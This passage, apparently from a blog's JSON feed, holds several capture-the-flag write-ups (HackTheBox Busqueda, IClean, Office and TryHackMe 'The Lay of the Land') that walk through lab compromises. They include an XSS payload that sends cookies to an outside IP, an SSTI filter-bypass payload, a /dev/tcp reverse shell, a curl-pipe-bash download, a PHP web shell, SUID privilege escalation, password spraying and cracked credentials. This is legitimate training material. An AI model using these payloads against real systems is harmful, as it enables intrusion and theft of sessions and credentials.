-u gitea -pyuiu1hoiu4i5ho1uh gitea 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | gitea | | information_schema | | performance_schema | +--------------------+ 3 rows in set (0.00 sec) mysql\u0026gt; use gitea; Database changed mysql\u0026gt; show tables; +---------------------------+ | Tables_in_gitea | +---------------------------+ | access | | access_token | | action | | app_state | | attachment | ... and so on ... we can get name, email and password from user\u0026rsquo;s table.\n1 2 3 4 5 6 7 mysql\u0026gt; select name,email,passwd from user; +---------------+----------------------------------+------------------------------------------------------------------------------------------------------+ | name | email | passwd | +---------------+----------------------------------+------------------------------------------------------------------------------------------------------+ | administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | | cody | cody@gitea.searcher.htb | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | +---------------+----------------------------------+------------------------------------------------------------------------------------------------------+ We found another user named as administrator, we can crack that hash, but cody\u0026rsquo;s password works for administrator, so we can able to login into gitea.\nIn here we found the source code for the all of the scripts, let\u0026rsquo;s look into it and exploit it!\nIn system-check.py we see that in docker-ps and docker-inspect it is running the commands with run_command functions with specific arguments so that is not vulnerable but full-check.sh on line 47 it is executing the file from current directory, that\u0026rsquo;s interesting. So if we try to run sudo python3 /opt/scripts/system-checkup.py full-checkup it will say Something went wrong that means it cannot be able to find full-checkup.sh in current directory and because of that it is going in except and exiting the program.\n1 2 3 4 5 6 7 8 elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) Alright, now that we have some hints, full-checkup.sh and run the command again for full checkup.\n1 2 3 4 #!/bin/bash cp /bin/bash /tmp/g4nd1v chmod 4777 /tmp/g4nd1v Next chain of commands\n1 2 3 4 chmod +x full-checkup.sh sudo python3 /opt/scripts/system-checkup.py full-checkup ls -l /tmp/g4nd1v /tmp/g4nd1v -p Outputs\n1 2 3 4 5 6 7 8 9 10 11 12 vc@busqueda:~$ chmod +x full-checkup.sh svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup [+] Done! svc@busqueda:~$ svc@busqueda:~$ ls -l /tmp/g4nd1v -rwsrwxrwx 1 root root 1396520 Dec 19 06:07 /tmp/g4nd1v svc@busqueda:~$ /tmp/g4nd1v -p g4nd1v-5.1# ls full-checkup.sh user.txt g4nd1v-5.1# cat /root/root.txt 46315751d8254a4e8d90430533984b32 ","description":"Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user and `Gitea` account. Further analysis of the system checkup script and source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.","id":11,"section":"posts","tags":["HackTheBox","CVE-2023-43364","docker","gitea","mysql"],"title":"HackTheBox Writeup - Busqueda Room","uri":"https://g4nd1v.github.io/posts/hackthebox-busqueda/"},{"content":" Title The Lay of the Land Description Learn about and get hands-on with common technologies and security products used in corporate environments; both host and network-based security solutions are covered. Difficulty Easy Maker tryhackme Task 1: Introduction This room introduces commonly-used concepts, technologies, and security products that we need to be aware of.\nIn this room, the assumption is that we have already gained access to the machine, and we are ready to expand our knowledge more about the environment by performing enumerating for the following:\nNetwork infrastrucutre Active Directory Environment Users and Groups Host-based security solutions Network-based security solutions Applications and services Task 2: Deploy the VM Deploy the machine and access with xfreerdp /v:10.10.184.154 /u:kkidd\nTask 3: Network Infrastructure Upon accessing an unknown network, the goal is to identify the network layout and potential targets. Enumeration of the compromised machine is key for understanding the system, services, and network.\nNetwork Segmentation: Divides a network into multiple subnets for better security and management. Helps prevent unauthorized access to sensitive assets like customer data. VLANs: Used in network segmentation to address issues like network broadcasting and enhance security. Devices within the same VLAN can only communicate with each other. Internal Networks: Segmented based on the importance of devices and data accessibility. Used to control traffic, improve performance, and enhance security. Internal networks facilitate internal communication, collaboration, and operational tools. DMZ (Demilitarized Zone): Adds a security layer by placing a subnetwork between the public internet and internal networks. Used to handle public services like web, DNS, FTP, and VPN while isolating untrusted traffic. Network Enumeration: Involves discovering networking aspects such as TCP/UDP ports, routing tables, and ARP tables. Use commands like netstat -na to list active connections and arp -a to reveal ARP tables. Helps identify internal services like DNS, web servers, and custom apps for further exploitation. Internal Network Services: These services, such as internal DNS or web servers, are only accessible within the network. After gaining access, these services become available for further actions, such as lateral movement or privilege escalation. Answer No Answer Needed!\nTask 4: Active Directory (AD) Environment Active Directory (AD) Environment Overview: AD is a Windows-based directory service for centralized management of authentication and authorization in internal networks. It stores essential data on users, computers, printers, etc. AD Data includes user details (job title, phone number, passwords, permissions) and network resources. Key Components: Domain Controllers (DC): Windows servers that manage AD services, control domains, and handle user/group policies. DCs store valuable information, making them prime targets for attackers. Organizational Units (OUs): Containers in the AD domain with hierarchical structures for organizing objects. AD Objects: Users: Security principals allowed to authenticate. Computers: Treated as special user accounts. GPOs (Group Policy Objects): Policies applied to other AD objects. AD Domains: Collections of AD components within the network. AD Forest: A collection of AD domains that trust each other. AD Service Accounts: Built-in local users, domain users, and managed service accounts. Domain Administrators: Manage access, users, and resources across the domain. AD Enumeration: After gaining initial access, discovering an AD environment is critical for red teamers. AD environments provide vast amounts of information useful for lateral movement. Checking AD Environment: Use the systeminfo command in the Command Prompt to check if a machine is part of an AD environment.\nsysteminfo | findstr Domain If the output shows a domain name, the machine is part of AD (e.g., Domain: thmdomain.com). If \u0026ldquo;WORKGROUP\u0026rdquo; appears, it indicates a local workgroup, not AD. Answers Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N) Y If it is part of an AD environment, what is the domain name of the AD? thmredteam.com Task 5: Users and Group Management Active Directory Users and Groups Overview: When gaining initial access to a compromised machine in an AD environment, understanding the user accounts and groups is crucial. These accounts have different roles, permissions, and access levels.\nCommon Active Directory Account Types: Built-in Local User Accounts: Manage systems locally, not part of the AD environment. Domain User Accounts: Have access to AD services and resources managed by AD. Managed Service Accounts: Limited domain user accounts with higher privileges to manage AD services. Domain Administrators: High-privilege user accounts with control over AD configurations, users, permissions, and more. Important AD Administrator Accounts: BUILTIN\\Administrator: Local admin access on a domain controller. Domain Admins: Admin access to all resources in the domain. Enterprise Admins: Only available in the AD forest root, powerful in multi-domain environments. Schema Admins: Can modify AD schema/domain/forest (useful for attackers). Server Operators: Can manage domain servers. Account Operators: Can manage non-privileged user accounts. AD Enumeration: Once inside the AD environment, use PowerShell to enumerate users and groups.\nPowerShell Commands for AD Enumeration: List All AD Users: Get-ADUser -Filter * List Users in a Specific Organizational Unit (OU): Use the -SearchBase option to search within a specific Common Name (CN): Get-ADUser -Filter * -SearchBase \u0026quot;CN=Users,DC=THMREDTEAM,DC=COM\u0026quot; Answers: Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available? Use this command Answer: 6 Once you run the previous command, what is the UserPrincipalName (email) of the admin account? 1 2 3 4 5 6 7 8 9 10 DistinguishedName : CN=THM Admin,OU=THM,DC=thmredteam,DC=com Enabled : True GivenName : THM Name : THM Admin ObjectClass : user ObjectGUID : 8974cd3d-9bf0-4c43-ac7d-068413fb462c SamAccountName : thmadmin SID : S-1-5-21-1966530601-3185510712-10604624-1124 Surname : Admin UserPrincipalName : thmadmin@thmredteam.com Answer: thmadmin@thmredteam.com Task 6: Host Security Solution #1 Host Security Solutions in Corporate Networks: When conducting red team engagements, it’s essential to enumerate and understand the security measures in place on the host, such as antivirus software, firewalls, and intrusion detection systems. Staying aware of these tools helps minimize detection during the engagement.\nKey Host Security Solutions: Antivirus Software (AV): Antivirus is used to detect and prevent malicious software from executing on the host. Detection methods include: - Signature-based detection: Matches files against a database of known malware signatures. - Heuristic-based detection: Analyzes files for suspicious properties using machine learning. - Behavior-based detection: Monitors real-time execution behavior, such as unusual registry changes or processes.\nPowerShell command to enumerate antivirus software:\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct Microsoft Windows Defender: A built-in security tool that leverages machine learning and big data analysis. It operates in three modes: - Active mode: Primary antivirus. - Passive mode: Secondary antivirus when 3rd party AV is present. - Disable mode: Disabled or uninstalled.\nCheck Windows Defender status:\nGet-Service WinDefend Get-MpComputerStatus | select RealTimeProtectionEnabled Host-based Firewall: Firewalls control inbound and outbound traffic, protecting the host from unauthorized access. Modern firewalls use packet analysis and can block traffic based on application-layer data.\nCheck firewall status:\nGet-NetFirewallProfile | Format-Table Name, Enabled\nDisable firewall profiles (if admin privileges are available):\nSet-NetFirewallProfile -Profile Domain, Public, Private -Enabled False\nTest network connection through the firewall:\nTest-NetConnection -ComputerName 127.0.0.1 -Port 80 Host-based Intrusion Detection/Prevention Systems (HIDS/HIPS): These monitor and respond to suspicious activities on the host. HIDS detects and logs potential attacks, while HIPS attempts to block or prevent malicious behavior. Endpoint Detection and Response (EDR): - EDR solutions continuously monitor and collect data from endpoints to detect and respond to advanced threats. They provide enhanced visibility and allow rapid detection and response to security incidents.\nBy understanding these host security solutions, red teamers can identify potential obstacles during their engagement. Each security feature can block or detect malicious activity, and knowledge of their presence allows attackers to better evade detection or disable defenses when needed. Answers: Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N) N Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record? PowerView.ps1 Enumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule? 17337 In the next task, we will keep discussing the host security solution. I\u0026rsquo;m ready! no answer needed Task 7: Host Security Solution #2 Host Security Solutions Overview\nSecurity Event Logging and Monitoring: Operating systems log events that can be monitored by administrators. Logs cover applications, system, security, and services. Use PowerShell to list available logs:\nGet-EventLog -List In corporate environments, log agents gather data from sensors for security analysis. System Monitor (Sysmon): Sysmon logs events like process creation, network connections, and file modifications, useful for detecting malicious activity. Check for Sysmon:\nGet-Process | Where-Object { $_.ProcessName -eq \u0026quot;Sysmon\u0026quot; }\nGet-CimInstance win32_service -Filter \u0026quot;Description = 'System Monitor service'\u0026quot;\nGet-Service | Where-Object { $_.DisplayName -like \u0026quot;*sysm*\u0026quot; } Check registry for Sysmon:\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational Check Sysmon config:\nfindstr /si '\u0026lt;ProcessCreate onmatch=\u0026quot;exclude\u0026quot;\u0026gt;' C:\\tools\\* Host-based Intrusion Detection/Prevention Systems (HIDS/HIPS): HIDS detects suspicious activities but doesn’t prevent them. Uses signature-based or anomaly-based methods. HIPS prevents attacks by monitoring logs, processes, and system resources. It integrates antivirus, firewalls, and behavior analysis. Endpoint Detection and Response (EDR): EDR detects threats like malware, ransomware, and exploit chains in real-time, providing advanced protection. Common EDR software: Cylance, Crowdstrike, Symantec, SentinelOne. Check for security products: Tools like Invoke-EDRChecker or SharpEDRChecker can enumerate antivirus, EDR, and logging products by analyzing file metadata, services, and drivers. Task 8: Network Security Solutions Network security solutions protect clients and devices in a network from malicious activities using both software and hardware. Key components include:\nNetwork Firewall: Filters untrusted traffic based on rules and policies before allowing access to the network. Types of firewalls include packet-filtering, proxy, NAT, and web application firewalls. Security Information and Event Management (SIEM): SIEM aggregates log data, monitors events, and analyzes them in real-time to detect threats. Key SIEM functions: log management, event analytics, incident monitoring, security alerts, and compliance reporting. Common SIEM products: Splunk, LogRhythm, SolarWinds, Datadog. Intrusion Detection/Prevention Systems (IDS/IPS): - IDS: Monitors network traffic and alerts for abnormal behaviors or known threats, requiring human or software action. - IPS: Automatically accepts or rejects network packets based on predefined rules. - Common IDS/IPS products: Palo Alto Networks, Cisco, McAfee NSP, Trend Micro, Suricata.\nThese solutions help secure internal systems, detect advanced threats, and mitigate attacks such as DDoS, phishing, and data exfiltration. Task 9: Applications and Services This task covers system enumeration, focusing on:\nInstalled Applications Services and Processes Sharing Files and Printers Internal Services (DNS, Local Web Applications) 1. Installed Applications To enumerate installed applications, use the wmic command:\nwmic product get name,version\nGet-ChildItem -Hidden -Path C:\\Users\\kkidd\\Desktop\\\n2. Services and Processes To list running services, use:\nnet start\nTo get detailed information about a specific service:\nwmic service where \u0026quot;name like 'THM Demo'\u0026quot; get Name,PathName\nTo check the process details:\nGet-Process -Name thm-demo\nTo list listening ports:\nnetstat -noa | findstr \u0026quot;LISTENING\u0026quot; | findstr \u0026quot;3212\u0026quot;\nKey Questions and Answers Port Number for THM Service: Answer: 13337 Visit localhost on that port: Flag: THM{S3rv1cs_1s_3numerat37ed} 3. Internal Services: DNS To perform a DNS zone transfer using nslookup.exe\n\u0026gt; server 10.10.184.154\nTo perform a zone transfer:\n\u0026gt; ls -d thmredteam.com\nKey Question Flag for one of the DNS records: Answer: THM{DNS-15-Enumerated!} Task 10: Conclusion This room is an introduction to client systems in corporate environments. The student should have a better understanding of how clients are used in a corporate network including:\nNetwork Infrastructure AD environment security measures (HIPS, AV, etc.) Internal applications and services Answer: No Answer Needed!\n","description":"Learn about and get hands-on with common technologies and security products used in corporate environments; both host and network-based security solutions are covered.","id":12,"section":"posts","tags":["TryHackMe"],"title":"TryHackMe Writeup - The Lay of the Land","uri":"https://g4nd1v.github.io/posts/tryhackme-the-lay-of-the-land/"},{"content":" Title IClean Description IClean is a medium-difficulty Linux machine featuring a website for a cleaning services company. The website contains a form where users can request a quote, which is found to be vulnerable to Cross-Site Scripting (XSS). This vulnerability is exploited to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to Server-Side Template Injection (SSTI), allowing us to obtain a reverse shell on the box. Enumeration reveals database credentials, which are leveraged to gain access to the database, leading to the discovery of a user hash. Cracking this hash provides SSH access to the machine. The user’s mail mentions working with PDFs. By examining the sudo configuration, it is found that the user can run qpdf as root. This is leveraged to attach the root private key to a PDF, which is then used to gain privileged access to the machine. Difficulty Medium Maker LazyTitan33 Foothold Nmap └─$ nmap -sC -sV -oA nmap/iclean 10.10.11.12\r# Nmap 7.94SVN scan initiated Tue Jul 23 22:26:36 2024 as: nmap -sC -sV -oA nmap/iclean 10.10.11.12\rNmap scan report for 10.10.11.12\rHost is up (0.092s latency).\rNot shown: 998 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey:\r| 256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)\r|_ 256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r|_http-server-header: Apache/2.4.52 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel There are only 2 services running, ssh and http. On visiting the webpage, it is redirecting us to capiclean.htb adding the host in /etc/hosts. Now we can able to see the webpage.\nThe only functionality I can see is login page /login - try to bruteforce using hydra or get a quote /quote - sent mail to admin, which probably leads to XSS. On other hand, we can also try gobuster in order to get endpoints.\nGoBuster └─$ gobuster dir -u capiclean.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://capiclean.htb\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/about (Status: 200) [Size: 5267]\r/login (Status: 200) [Size: 2106]\r/services (Status: 200) [Size: 8592]\r/team (Status: 200) [Size: 8109]\r/quote (Status: 200) [Size: 2237]\r/logout (Status: 302) [Size: 189] [--\u0026gt; /]\r/dashboard (Status: 302) [Size: 189] [--\u0026gt; /]\r/choose (Status: 200) [Size: 6084] No interesting endpoint found from gobuster.\nXSS on Quote Page So, let\u0026rsquo;s start with quote page. On submitting the quote, it says - Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services. I can sense there is something to do related to XSS. Here is the request.\nI have tried simple payloads of XSS and URL encoded it, and yes, I got a hit. Payload used - \u0026lt;img src=x onerror=fetch(\u0026quot;http://10.10.15.125/?c=\u0026quot;+document.cookie);\u0026gt;\nHere is the session cookie - eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq16Cw.eOHOWeSVCA2DYHyuXuFx3IJLxOI. Now adding that to our browser. On our previous gobuster scan, we have seen there is a dashboard which was redirecting us to homepage, now it\u0026rsquo;s try to visit /dashboard.\nSSTI There are multiple functionalities in dashboard such as Generate Invoice, Generate QR, Edit Services, Quote Requests. So let\u0026rsquo;s start with first one, Generate Invoice. It will simply generate Invoice ID - 7251335009. Next, Generate QR will generate the QR code for invoice. On bottom of this page when you get QR URL, there is another field, that is generating invoice based on the images provided. Here is the request.\nNow, as it was evaluating the images, I thought of using SSTI payload, and luckily it worked.\nI have tried multiple payloads, but all of them are giving 500 - Internal Server Error except this one. {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\nThis Payload bypasses most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:\nSimple URL Encoding of reverse shell was not working - bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.125/4444 0\u0026gt;\u0026amp;1 So I have to use file and transfer it with curl and using bash execute it with this payload. So making a file with rev shell at shell and then start python http server and use this payload curl+http://10.10.15.125:8000/shell|bash.\nUser Flag In app.py \u0026gt; db_config we can able to get the password for user database user iclean\ndb_config = {\r\u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;,\r\u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;,\r\u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;,\r\u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39;\r} Get Full TTY using this commands\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;\rCtrl + Z\rstty raw -echo; fg\rThen it will continue the shell and just press enter(assuming you\u0026#39;re on kali) MySQL Login with mysql with this command mysql -u iclean -p then enter password.\nIn MySQL this are the commands used.\nCommands Description show databases; To get a list of databases use \u0026lt;db_name\u0026gt;; To select any particular DB show tables; To list all the tables on selected DB. SELECT To select rows from DB We got the hashes for admin and consuela user. With crackstation we can able to get the password for consuela user which is simple and clean.\nWe can able to login with SSH using this password.\nconsuela@iclean:~$ cat user.txt\r7b30cf22980c2fc947e1e25ab39db1c4 Root Flag With sudo -l we can able to run /usr/bin/qpdf binary as root.\nconsuela@iclean:~$ sudo -l\r[sudo] password for consuela:\rMatching Defaults entries for consuela on iclean:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser consuela may run the following commands on iclean:\r(ALL) /usr/bin/qpdf Checking --help in this binary.\nFrom help menu, I can not be able to do much, I have to see it\u0026rsquo;s official documentation for more context. And finally I came up with a payload.\nsudo /usr/bin/qpdf --empty /tmp/root.txt --qdf --add-attachment /root/root.txt --. It will create a root.txt file in tmp directory.\nRoot Flag - 4c2f59a87ce4ad788333aa64407c5563\n","description":"IClean is a medium-difficulty Linux machine featuring a website for a cleaning services company. The website contains a form where users can request a quote, which is found to be vulnerable to Cross-Site Scripting (XSS). This vulnerability is exploited to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to Server-Side Template Injection (SSTI), allowing us to obtain a reverse shell on the box. Enumeration reveals database credentials, which are leveraged to gain access to the database, leading to the discovery of a user hash. Cracking this hash provides `SSH` access to the machine. The user’s mail mentions working with PDFs. By examining the `sudo` configuration, it is found that the user can run `qpdf` as `root`. This is leveraged to attach the `root` private key to a PDF, which is then used to gain privileged access to the machine.","id":13,"section":"posts","tags":["HackTheBox","XSS","gobuster","SSTI","mysql"],"title":"HackTheBox Writeup - IClean Room","uri":"https://g4nd1v.github.io/posts/hackthebox-iclean/"},{"content":" Title Office Description Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the MacroSecurityLevel registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges. Difficulty Hard Maker 0rii Footprinting 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 └─$ cat nmap/office.nmap # Nmap 7.94SVN scan initiated Sat Jun 29 11:58:59 2024 as: nmap -sC -sV -oA nmap/office 10.10.11.3 Nmap scan report for 10.10.11.3 Host is up (0.092s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_http-generator: Joomla! - Open Source Content Management | http-robots.txt: 16 disallowed entries (15 shown) | /joomla/administrator/ /administrator/ /api/ /bin/ | /cache/ /cli/ /components/ /includes/ /installation/ |_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ |_http-title: Home |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-29 23:59:17Z) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 |_http-title: 403 Forbidden |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-06-30T00:00:40+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-06-30T00:00:41+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 |_ssl-date: 2024-06-30T00:00:40+00:00; +8h00m01s from scanner time. Service Info: Hosts: www.example.com, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-06-30T00:00:01 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m00s Notable Services Running Port Service 80 joomla 445 SMB 465 Kerberos 636 LDAP Notable Domains office.htb dc.office.htb\nAdd this domains to /etc/hosts Joomla From http://office.htb/administrator/manifests/files/joomla.xml file, we found the version of Joomla is 4.2.7. Checking for the CVE will lead up to this https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT - CVE-2023-23752.\nMore info about vuln - https://vulncheck.com/blog/joomla-for-rce\npython3 CVE-2023-23752.py -u http://office.htb\nWe got the password - H0lOgrams4reTakIng0Ver754!\nThere is a page /api/index.php/v1/users?public=true where we can find users.\nWe found one more domain - holography.htb add this domain to /etc/hosts.\nI have tried to login with this username and password with both of the domains. But it is not allowing us to login. Next thing we need is the username or something.\nUsername Enumeration We can bruteforce username using kerbrute. and we can use jsmith wordlist.\n./kerbrute_linux_386 userenum -d office.htb --dc 10.10.11.3 ./jsmith\nAdd list of usernames to user.txt\newhite\rdmichael\rdwolfe\rtstark\rhhogan\rppotts Password Spraying As we have list of usernames and a password, we can do password spraying attack. We can use crackmapexec for it.\nWe found a username dwolfe.\nSMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)\rSMB 10.10.11.3 445 DC [-] office.htb\\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE\rSMB 10.10.11.3 445 DC [-] office.htb\\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE\rSMB 10.10.11.3 445 DC [+] office.htb\\dwolfe:H0lOgrams4reTakIng0Ver754! SMB Enumeration List shares\nGet SOC Analysis share\nPcap Analysis We got pcap file named as Latest-System-Dump-8fbc124d.pcap. Open it with wireshark. Go to Statistics \u0026gt; Protocol Hierarchy to see the protocols that are being used. We can see, TCP, UDP, SMB, Kerberos etc protocols. We can directly follow TCP stream by right clicking the protocol.\nWe are following Kerberos stream and in that packet, we found Kerberos hash.\nThe etype of hash is 18, so we will use Kerberos 5, etype 18, Pre-Auth - 19900 mode in hashcat in order to crack the hash. Also we can see the hash is of tstark user.\nAppend the hash string with the cipher, so the hash will be $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc\n└─$ hashcat -m 19900 tstark.hash /usr/share/wordlists/rockyou.txt --show\r$krb5pa$18$hashcat$google.com$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 Again, checking this creds with crackmapexec.\n└─$ sudo crackmapexec smb 10.10.11.3 -u tstark -p playboy69\r[sudo] password for kali:\rSMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)\rSMB 10.10.11.3 445 DC [+] office.htb\\tstark:playboy69 I have tried to login with SMB with this creds, but it has same shares as before. I have tried to login with this creds in office.htb Jooma admin portal, but didn\u0026rsquo;t work. Then I remember that it has administrator user, so I have tried to use this password playboy69 with that username, and boom, we can able to login.\nweb account shell Now, go to System -\u0026gt; sites templates -\u0026gt; Cassiopeia Details and Files -\u0026gt; edit error.php - add this line after php system($_GET['cmd']);. Then make an request to the shell.\nIt keeps on reloading the code, so we have to keep an eye on updating file every time. Now generate a reverse shell from revshells.com and instead of whoami enter it with rev shell and replace spaces with + and boom, we will get the shell from web_account\ntstark shell and user flag We can use RunasCs and nc to get tstark shell as we already have it\u0026rsquo;s credentials.\nDownload each files and using python3 -m http.server transfer each files to windows with this wget http://10.10.14.156/nc.exe -o C:\\Windows\\Tasks\\nc.exe.\nNow, run the binary in order to get tstark shell.\nC:\\Windows\\Tasks\\runas.exe tstark playboy69 cmd.exe -r 10.10.14.156:443\n1 2 PS C:\\Users\\tstark\\Desktop\u0026gt; cat user.txt 7870a5d3dbb5ec949ccc83cc1c3069d6 PPots Shell Checking groups and privilages from tstark user.\nPS C:\\Users\u0026gt; whoami /priv\rwhoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= ============================== ========\rSeMachineAccountPrivilege Add workstations to domain Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\rPS C:\\Users\u0026gt; whoami /groups\rwhoami /groups\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes\r========================================== ================ ============================================= ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only\rBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group\rCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group 